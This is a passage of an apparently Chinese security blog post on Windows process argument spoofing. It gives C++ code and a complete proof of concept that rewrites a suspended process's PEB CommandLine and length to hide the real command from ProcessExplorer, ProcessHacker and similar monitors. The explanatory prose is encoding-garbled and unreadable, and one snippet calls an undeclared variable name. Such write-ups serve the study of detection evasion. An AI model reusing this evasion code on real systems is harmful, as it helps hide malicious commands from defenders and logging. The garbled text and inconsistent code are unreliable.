rel="noopener">CreateProcessA</a>ÂáΩÊï∞‰∏≠Êàë‰ª¨ÂÖ≥Ê≥®Âà∞lpCommandLineÂíådwCreationFlags</p><ul><li>lpCommandLineÔºöË¶ÅÊâßË°åÁöÑÂëΩ‰ª§Ë°å -&gt; ÊòéÈù¢‰∏äË¶ÅÊâßË°åÁöÑÂëΩ‰ª§Ë°å</li><li><a href="https://docs.microsoft.com/en-us/windows/win32/procthread/process-creation-flags" target="_blank" rel="noopener">dwCreationFlags</a>ÔºöÊµÅÁ®ãÂàõÂª∫Ê†áÂøó</li></ul><p>Âú®<code>ÊµÅÁ®ãÂàõÂª∫Ê†áÂøó</code>‰∏≠Â§ö‰∏™Ê†áËÆ∞‰ΩøÁî®<code>|(Êàñ)ËøêÁÆó</code>Âè†Âä†ÔºåÊúâ‰ª•‰∏ãÂá†‰∏™Â∏∏Êï∞ÂÄºÈúÄË¶ÅÂÖ≥Ê≥®</p><table><thead><tr><th>Â∏∏Êï∞/ÂÄº</th><th>ÊèèËø∞</th></tr></thead><tbody><tr><td>CREATE_NEW_CONSOLE<br>0x00000010</td><td>Êñ∞ËøõÁ®ãÂÖ∑Êúâ‰∏Ä‰∏™Êñ∞ÁöÑÊéßÂà∂Âè∞ÔºåËÄå‰∏çÊòØÁªßÊâøÂÖ∂Áà∂Á∫ßÁöÑÊéßÂà∂Âè∞ÔºàÈªòËÆ§Ôºâ„ÄÇÊúâÂÖ≥Êõ¥Â§ö‰ø°ÊÅØÔºåËØ∑ÂèÇËßÅÂàõÂª∫ÊéßÂà∂Âè∞„ÄÇ<br>ËØ•Ê†áÂøó‰∏çËÉΩ‰∏é<strong>DETACHED_PROCESS</strong>‰∏ÄËµ∑‰ΩøÁî®„ÄÇ</td></tr><tr><td>CREATE_NO_WINDOW<br>0x08000000</td><td>ËØ•ËøáÁ®ãÊòØ‰∏Ä‰∏™Ê≤°ÊúâÊéßÂà∂Âè∞Á™óÂè£Âç≥ÂèØËøêË°åÁöÑÊéßÂà∂Âè∞Â∫îÁî®Á®ãÂ∫è„ÄÇÂõ†Ê≠§ÔºåÊú™ËÆæÁΩÆÂ∫îÁî®Á®ãÂ∫èÁöÑÊéßÂà∂Âè∞Âè•ÊüÑ„ÄÇ<br>Â¶ÇÊûúËØ•Â∫îÁî®Á®ãÂ∫è‰∏çÊòØÊéßÂà∂Âè∞Â∫îÁî®Á®ãÂ∫èÔºåÊàñËÄÖ‰∏é<strong>CREATE_NEW_CONSOLE</strong>Êàñ<strong>DETACHED_PROCESS</strong>‰∏ÄËµ∑‰ΩøÁî®ÔºåÂàôÂ∞ÜÂøΩÁï•Ê≠§Ê†áÂøó„ÄÇ</td></tr><tr><td>CREATE_SUSPENDED<br>0x00000004</td><td>Êñ∞ËøõÁ®ãÁöÑ‰∏ªÁ∫øÁ®ãÂú®ÊåÇËµ∑Áä∂ÊÄÅ‰∏ãÂàõÂª∫ÔºåÂπ∂‰∏îÁõ¥Âà∞Ë∞ÉÁî®<strong>ResumeThread</strong>ÂáΩÊï∞ÊâçËøêË°å„ÄÇ</td></tr></tbody></table><p>‰ª•‰∏ãËØïÂõæÂàõÂª∫‰∏Ä‰∏™ËøõÁ®ãÂπ∂ÊåÇËµ∑ÔºåÊàë‰ª¨Êé•‰∏ãÊù•Â∞Ü‰øÆÊîπÊ≠§ËøõÁ®ã</p><pre class=" language-cpp"><code class="language-cpp">STARTUPINFOA si<span class="token punctuation">;</span>PROCESS_INFORMATION pi<span class="token punctuation">;</span><span class="token function">CreateProcessA</span><span class="token punctuation">(</span>    <span class="token constant">NULL</span><span class="token punctuation">,</span>    <span class="token string">"cmd.exe"</span><span class="token punctuation">,</span>    <span class="token constant">NULL</span><span class="token punctuation">,</span>    <span class="token constant">NULL</span><span class="token punctuation">,</span>    FALSE<span class="token punctuation">,</span>    CREATE_SUSPENDED <span class="token operator">|</span> CREATE_NEW_CONSOLE<span class="token punctuation">,</span>    <span class="token constant">NULL</span><span class="token punctuation">,</span>    <span class="token string">"C:\\Windows\\System32\\"</span><span class="token punctuation">,</span>    <span class="token operator">&amp;</span>si<span class="token punctuation">,</span>    <span class="token operator">&amp;</span>pi<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="PEB"><a href="#PEB" class="headerlink" title="PEB"></a>PEB</h2><p>È¶ñÂÖàÁúãÂú® PEB ÁªìÊûÑÔºåÊàë‰ª¨‰∏ªË¶ÅÂÖ≥Ê≥® ProcessParameters</p><pre class=" language-cpp"><code class="language-cpp"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> _PEB <span class="token punctuation">{</span>  BYTE                          Reserved1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  BYTE                          BeingDebugged<span class="token punctuation">;</span>  BYTE                          Reserved2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  PVOID                         Reserved3<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  PPEB_LDR_DATA                 Ldr<span class="token punctuation">;</span>  PRTL_USER_PROCESS_PARAMETERS  ProcessParameters<span class="token punctuation">;</span>  PVOID                         Reserved4<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  PVOID                         AtlThunkSListPtr<span class="token punctuation">;</span>  PVOID                         Reserved5<span class="token punctuation">;</span>  ULONG                         Reserved6<span class="token punctuation">;</span>  PVOID                         Reserved7<span class="token punctuation">;</span>  ULONG                         Reserved8<span class="token punctuation">;</span>  ULONG                         AtlThunkSListPtr32<span class="token punctuation">;</span>  PVOID                         Reserved9<span class="token punctuation">[</span><span class="token number">45</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  BYTE                          Reserved10<span class="token punctuation">[</span><span class="token number">96</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine<span class="token punctuation">;</span>  BYTE                          Reserved11<span class="token punctuation">[</span><span class="token number">128</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  PVOID                         Reserved12<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  ULONG                         SessionId<span class="token punctuation">;</span><span class="token punctuation">}</span> PEB<span class="token punctuation">,</span> <span class="token operator">*</span>PPEB<span class="token punctuation">;</span></code></pre><p>PRTL_USER_PROCESS_PARAMETERS ÁªìÊûÑ‰Ωì</p><pre class=" language-cpp"><code class="language-cpp"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> _RTL_USER_PROCESS_PARAMETERS <span class="token punctuation">{</span>  BYTE           Reserved1<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  PVOID          Reserved2<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  UNICODE_STRING ImagePathName<span class="token punctuation">;</span>  UNICODE_STRING CommandLine<span class="token punctuation">;</span><span class="token punctuation">}</span> RTL_USER_PROCESS_PARAMETERS<span class="token punctuation">,</span> <span class="token operator">*</span>PRTL_USER_PROCESS_PARAMETERS<span class="token punctuation">;</span></code></pre><p>UNICODE_STRING Á±ªÂûãÁªìÊûÑ‰Ωì</p><pre class=" language-cpp"><code class="language-cpp"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> _UNICODE_STRING <span class="token punctuation">{</span>  USHORT Length<span class="token punctuation">;</span>  USHORT MaximumLength<span class="token punctuation">;</span>  PWSTR  Buffer<span class="token punctuation">;</span><span class="token punctuation">}</span> UNICODE_STRING<span class="token punctuation">,</span> <span class="token operator">*</span>PUNICODE_STRING<span class="token punctuation">;</span></code></pre><p>Âú®‰∏äÈù¢ÈÄöËøáÂàõÂª∫Âπ∂ÊåÇËµ∑ËøõÁ®ãÂêéÔºåÊé•‰∏ãÊù•Êàë‰ª¨Â∞ÜÈÄöËøá<a href="https://docs.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntqueryinformationprocess" target="_blank" rel="noopener">NtQueryInformationProcess</a>Êù•Ëé∑Âèñ PEB Âú∞ÂùÄÔºåËøô‰∏™ÂáΩÊï∞Êú™ÂÖ¨ÂºÄÊâÄ‰ª•ÈúÄË¶Å<a href="https://docs.microsoft.com/en-us/cpp/build/getprocaddress?view=vs-2019" target="_blank" rel="noopener">GetProcAddress</a>‰ªé DLL ‰∏≠Ê£ÄÁ¥¢Âá∫ÂáΩÊï∞Âú∞ÂùÄ</p><pre class=" language-cpp"><code class="language-cpp"><span class="token keyword">typedef</span> <span class="token function">NTSTATUS</span> <span class="token punctuation">(</span><span class="token operator">*</span>NtQueryInformationProcess<span class="token punctuation">)</span><span class="token punctuation">(</span>  IN HANDLE<span class="token punctuation">,</span>  IN PROCESSINFOCLASS<span class="token punctuation">,</span>  OUT PVOID<span class="token punctuation">,</span>  IN ULONG<span class="token punctuation">,</span>  OUT PULONG<span class="token punctuation">)</span><span class="token punctuation">;</span>NtQueryInformationProcess ntip <span class="token operator">=</span> <span class="token punctuation">(</span>NtQueryInformationProcess<span class="token punctuation">)</span><span class="token function">GetProcAddress</span><span class="token punctuation">(</span><span class="token function">LoadLibrary</span><span class="token punctuation">(</span><span class="token string">"ntdll.dll"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"NtQueryInformationProcess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>PROCESS_BASIC_INFORMATION pbi<span class="token punctuation">;</span>DWORD retLen<span class="token punctuation">;</span><span class="token function">ntpi</span><span class="token punctuation">(</span>    pi<span class="token punctuation">.</span>hProcess<span class="token punctuation">,</span>    ProcessBasicInformation<span class="token punctuation">,</span>    <span class="token operator">&amp;</span>pbi<span class="token punctuation">,</span>    <span class="token keyword">sizeof</span><span class="token punctuation">(</span>pbi<span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token operator">&amp;</span>retLen<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>ÈÄöËøá PEB Ê†áËÆ∞ÁöÑÂú∞ÂùÄÔºå‰ΩøÁî®<code>ReadProcessMemory</code>ËØªÂèñÁõÆÊ†áËøõÁ®ãÁöÑ PEB ‰ø°ÊÅØ</p><pre class=" language-cpp"><code class="language-cpp">PEB pebLocal<span class="token punctuation">;</span>BOOL success<span class="token punctuation">;</span>success <span class="token operator">=</span> <span class="token function">ReadProcessMemory</span><span class="token punctuation">(</span>pi<span class="token punctuation">.</span>hProcess<span class="token punctuation">,</span> pbi<span class="token punctuation">.</span>PebBaseAddress<span class="token punctuation">,</span> <span class="token operator">&amp;</span>pebLocal<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>PEB<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>bytesRead<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>Ëøõ‰∏ÄÊ≠•Ëé∑ÂèñProcessParametersÁªìÊûÑ‰Ωì‰ø°ÊÅØ</p><pre class=" language-cpp"><code class="language-cpp"><span class="token keyword">void</span><span class="token operator">*</span> <span class="token function">readProcessMemory</span><span class="token punctuation">(</span>HANDLE process<span class="token punctuation">,</span> <span class="token keyword">void</span><span class="token operator">*</span> address<span class="token punctuation">,</span> DWORD bytes<span class="token punctuation">)</span> <span class="token punctuation">{</span>    SIZE_T bytesRead<span class="token punctuation">;</span>    <span class="token keyword">char</span><span class="token operator">*</span> alloc<span class="token punctuation">;</span>    alloc <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>alloc <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ReadProcessMemory</span><span class="token punctuation">(</span>process<span class="token punctuation">,</span> address<span class="token punctuation">,</span> alloc<span class="token punctuation">,</span> bytes<span class="token punctuation">,</span> <span class="token operator">&amp;</span>bytesRead<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">free</span><span class="token punctuation">(</span>alloc<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> alloc<span class="token punctuation">;</span><span class="token punctuation">}</span>RTL_USER_PROCESS_PARAMETERS<span class="token operator">*</span> parameters<span class="token punctuation">;</span>parameters <span class="token operator">=</span> <span class="token punctuation">(</span>RTL_USER_PROCESS_PARAMETERS<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">readProcessMemory</span><span class="token punctuation">(</span>    pi<span class="token punctuation">.</span>hProcess<span class="token punctuation">,</span>     pebLocal<span class="token punctuation">.</span>ProcessParameters<span class="token punctuation">,</span>     <span class="token keyword">sizeof</span><span class="token punctuation">(</span>RTL_USER_PROCESS_PARAMETERS<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>Êé•‰∏ãÊù•‰æøÊòØ‰øÆÊîπProcessParameters‰∏≠ÁöÑCommandLineÔºåÂÖ∂ÂØπÂ∫îÁ±ªÂûã‰∏∫UNICODE_STRING</p><pre class=" language-cpp"><code class="language-cpp">BOOL <span class="token function">writeProcessMemory</span><span class="token punctuation">(</span>HANDLE process<span class="token punctuation">,</span> <span class="token keyword">void</span><span class="token operator">*</span> address<span class="token punctuation">,</span> <span class="token keyword">void</span><span class="token operator">*</span> data<span class="token punctuation">,</span> DWORD bytes<span class="token punctuation">)</span> <span class="token punctuation">{</span>    SIZE_T bytesWritten<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">WriteProcessMemory</span><span class="token punctuation">(</span>process<span class="token punctuation">,</span> address<span class="token punctuation">,</span> data<span class="token punctuation">,</span> bytes<span class="token punctuation">,</span> <span class="token operator">&amp;</span>bytesWritten<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">}</span>success <span class="token operator">=</span> <span class="token function">writeProcessMemory</span><span class="token punctuation">(</span>    pi<span class="token punctuation">.</span>hProcess<span class="token punctuation">,</span>     parameters<span class="token operator">-</span><span class="token operator">></span>CommandLine<span class="token punctuation">.</span>Buffer<span class="token punctuation">,</span>     <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>L<span class="token string">"cmd.exe /k dir\0"</span><span class="token punctuation">,</span>     <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="ÁªïËøáPEBÂâØÊú¨Ê£ÄÊµã"><a href="#ÁªïËøáPEBÂâØÊú¨Ê£ÄÊµã" class="headerlink" title="ÁªïËøáPEBÂâØÊú¨Ê£ÄÊµã"></a>ÁªïËøáPEBÂâØÊú¨Ê£ÄÊµã</h2><p>‰ΩúËÄÖÊèêÂà∞Á±ª‰ººProcessExplorerÂ∑•ÂÖ∑‰ºöÊ£ÄÁ¥¢PEBÂâØÊú¨ÔºåÂØºËá¥ÈöêËóèÂèÇÊï∞Â§±Ë¥•ÔºåÊ≥®ÊÑèÂà∞_RTL_USER_PROCESS_PARAMETERS‰∏≠ÁöÑCommandLineÂèÇÊï∞‰∏∫_UNICODE_STRINGÁ±ªÂûã</p><pre class=" language-cpp"><code class="language-cpp"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> _UNICODE_STRING <span class="token punctuation">{</span>  USHORT Length<span class="token punctuation">;</span>  USHORT MaximumLength<span class="token punctuation">;</span>  PWSTR  Buffer<span class="token punctuation">;</span><span class="token punctuation">}</span> UNICODE_STRING<span class="token punctuation">,</span> <span class="token operator">*</span>PUNICODE_STRING<span class="token punctuation">;</span></code></pre><p>ÂΩìËÆæÁΩÆ<code>Length &lt; sizeof(Buffer)</code>Êó∂ÔºåÂØπ‰∫éProcessHackerÂíåProcessExplorerÔºåÈÉΩ‰ºöÁªàÊ≠¢ÊòæÁ§∫LengthÂ≠óËäÇÂêéÈù¢ÁöÑÂ≠óÁ¨¶‰∏≤Ôºå‰ΩÜÂêåÊó∂Âπ∂‰∏çÂΩ±ÂìçËøõÁ®ãÁöÑËøêË°å</p><table><thead><tr><th align="center">ProcessExplorer</th><th align="center">ProcessMonitor</th></tr></thead><tbody><tr><td align="center">ÈïøÂ∫¶ÈôêÂà∂</td><td align="center">ÂëΩ‰ª§ÈöêËóè</td></tr><tr><td align="center"><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/c5e878c3/15965291301083.jpg" alt="-w501"></td><td align="center"><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/c5e878c3/15965291123554.jpg" alt="-w638"></td></tr></tbody></table><h2 id="Poc"><a href="#Poc" class="headerlink" title="Poc"></a>Poc</h2><pre class=" language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;windows.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;winternl.h></span></span><span class="token macro property">#<span class="token directive keyword">define</span> CMD_TO_SHOW "powershell.exe -NoExit -c Write-Host 'This is just a friendly argument, nothing to see here'"</span><span class="token macro property">#<span class="token directive keyword">define</span> CMD_TO_EXEC L"powershell.exe -NoExit -c Write-Host Surprise, arguments spoofed\0"</span><span class="token keyword">typedef</span> <span class="token function">NTSTATUS</span><span class="token punctuation">(</span><span class="token operator">*</span>NtQueryInformationProcess2<span class="token punctuation">)</span><span class="token punctuation">(</span>    IN HANDLE<span class="token punctuation">,</span>    IN PROCESSINFOCLASS<span class="token punctuation">,</span>    OUT PVOID<span class="token punctuation">,</span>    IN ULONG<span class="token punctuation">,</span>    OUT PULONG    <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span><span class="token operator">*</span> <span class="token function">readProcessMemory</span><span class="token punctuation">(</span>HANDLE process<span class="token punctuation">,</span> <span class="token keyword">void</span><span class="token operator">*</span> address<span class="token punctuation">,</span> DWORD bytes<span class="token punctuation">)</span> <span class="token punctuation">{</span>    SIZE_T bytesRead<span class="token punctuation">;</span>    <span class="token keyword">char</span><span class="token operator">*</span> alloc<span class="token punctuation">;</span>    alloc <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>alloc <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ReadProcessMemory</span><span class="token punctuation">(</span>process<span class="token punctuation">,</span> address<span class="token punctuation">,</span> alloc<span class="token punctuation">,</span> bytes<span class="token punctuation">,</span> <span class="token operator">&amp;</span>bytesRead<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">free</span><span class="token punctuation">(</span>alloc<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> alloc<span class="token punctuation">;</span><span class="token punctuation">}</span>BOOL <span class="token function">writeProcessMemory</span><span class="token punctuation">(</span>HANDLE process<span class="token punctuation">,</span> <span class="token keyword">void</span><span class="token operator">*</span> address<span class="token punctuation">,</span> <span class="token keyword">void</span><span class="token operator">*</span> data<span class="token punctuation">,</span> DWORD bytes<span class="token punctuation">)</span> <span class="token punctuation">{</span>    SIZE_T bytesWritten<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">WriteProcessMemory</span><span class="token punctuation">(</span>process<span class="token punctuation">,</span> address<span class="token punctuation">,</span> data<span class="token punctuation">,</span> bytes<span class="token punctuation">,</span> <span class="token operator">&amp;</span>bytesWritten<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> canttrustthis<span class="token punctuation">)</span><span class="token punctuation">{</span>    STARTUPINFOA si<span class="token punctuation">;</span>    PROCESS_INFORMATION pi<span class="token punctuation">;</span>    CONTEXT context<span class="token punctuation">;</span>    BOOL success<span class="token punctuation">;</span>    PROCESS_BASIC_INFORMATION pbi<span class="token punctuation">;</span>    DWORD retLen<span class="token punctuation">;</span>    SIZE_T bytesRead<span class="token punctuation">;</span>    PEB pebLocal<span class="token punctuation">;</span>    RTL_USER_PROCESS_PARAMETERS<span class="token operator">*</span> parameters<span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Argument Spoofing Example by @_xpn_\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>si<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>si<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>pi<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>pi<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Start process suspended</span>    success <span class="token operator">=</span> <span class="token function">CreateProcessA</span><span class="token punctuation">(</span>        <span class="token constant">NULL</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span>LPSTR<span class="token punctuation">)</span>CMD_TO_SHOW<span class="token punctuation">,</span>        <span class="token constant">NULL</span><span class="token punctuation">,</span>        <span class="token constant">NULL</span><span class="token punctuation">,</span>        FALSE<span class="token punctuation">,</span>        CREATE_SUSPENDED <span class="token operator">|</span> CREATE_NEW_CONSOLE<span class="token punctuation">,</span>        <span class="token constant">NULL</span><span class="token punctuation">,</span>        <span class="token string">"C:\\Windows\\System32\\"</span><span class="token punctuation">,</span>        <span class="token operator">&amp;</span>si<span class="token punctuation">,</span>        <span class="token operator">&amp;</span>pi<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>success <span class="token operator">==</span> FALSE<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Error: Could not call CreateProcess\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// Retrieve information on PEB location in process</span>    NtQueryInformationProcess2 ntpi <span class="token operator">=</span> <span class="token punctuation">(</span>NtQueryInformationProcess2<span class="token punctuation">)</span><span class="token function">GetProcAddress</span><span class="token punctuation">(</span><span class="token function">LoadLibraryA</span><span class="token punctuation">(</span><span class="token string">"ntdll.dll"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"NtQueryInformationProcess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">ntpi</span><span class="token punctuation">(</span>        pi<span class="token punctuation">.</span>hProcess<span class="token punctuation">,</span>        ProcessBasicInformation<span class="token punctuation">,</span>        <span class="token operator">&amp;</span>pbi<span class="token punctuation">,</span>        <span class="token keyword">sizeof</span><span class="token punctuation">(</span>pbi<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token operator">&amp;</span>retLen    <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Read the PEB from the target process</span>    success <span class="token operator">=</span> <span class="token function">ReadProcessMemory</span><span class="token punctuation">(</span>pi<span class="token punctuation">.</span>hProcess<span class="token punctuation">,</span> pbi<span class="token punctuation">.</span>PebBaseAddress<span class="token punctuation">,</span> <span class="token operator">&amp;</span>pebLocal<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>PEB<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>bytesRead<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>success <span class="token operator">==</span> FALSE<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Error: Could not call ReadProcessMemory to grab PEB\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// Grab the ProcessParameters from PEB</span>    parameters <span class="token operator">=</span> <span class="token punctuation">(</span>RTL_USER_PROCESS_PARAMETERS<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">readProcessMemory</span><span class="token punctuation">(</span>        pi<span class="token punctuation">.</span>hProcess<span class="token punctuation">,</span>        pebLocal<span class="token punctuation">.</span>ProcessParameters<span class="token punctuation">,</span>        <span class="token keyword">sizeof</span><span class="token punctuation">(</span>RTL_USER_PROCESS_PARAMETERS<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">300</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Set the actual arguments we are looking to use</span>    WCHAR spoofed<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> CMD_TO_EXEC<span class="token punctuation">;</span>    success <span class="token operator">=</span> <span class="token function">writeProcessMemory</span><span class="token punctuation">(</span>pi<span class="token punctuation">.</span>hProcess<span class="token punctuation">,</span> parameters<span class="token operator">-</span><span class="token operator">></span>CommandLine<span class="token punctuation">.</span>Buffer<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>spoofed<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>spoofed<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>success <span class="token operator">==</span> FALSE<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Error: Could not call WriteProcessMemory to update commandline args\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/////// Below we can see an example of truncated output in ProcessHacker and ProcessExplorer /////////</span>    <span class="token comment" spellcheck="true">// Update the CommandLine length (Remember, UNICODE length here)</span>    DWORD newUnicodeLen <span class="token operator">=</span> <span class="token number">28</span><span class="token punctuation">;</span>    success <span class="token operator">=</span> <span class="token function">writeProcessMemory</span><span class="token punctuation">(</span>        pi<span class="token punctuation">.</span>hProcess<span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>pebLocal<span class="token punctuation">.</span>ProcessParameters <span class="token operator">+</span> <span class="token function">offsetof</span><span class="token punctuation">(</span>RTL_USER_PROCESS_PARAMETERS<span class="token punctuation">,</span> CommandLine<span class="token punctuation">.</span>Length<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>newUnicodeLen<span class="token punctuation">,</span>        <span class="token number">4</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>success <span class="token operator">==</span> FALSE<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Error: Could not call WriteProcessMemory to update commandline arg length\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// Resume thread execution*/</span>    <span class="token function">ResumeThread</span><span class="token punctuation">(</span>pi<span class="token punctuation">.</span>hThread<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="ÊÄùËÄÉ"><a href="#ÊÄùËÄÉ" class="headerlink" 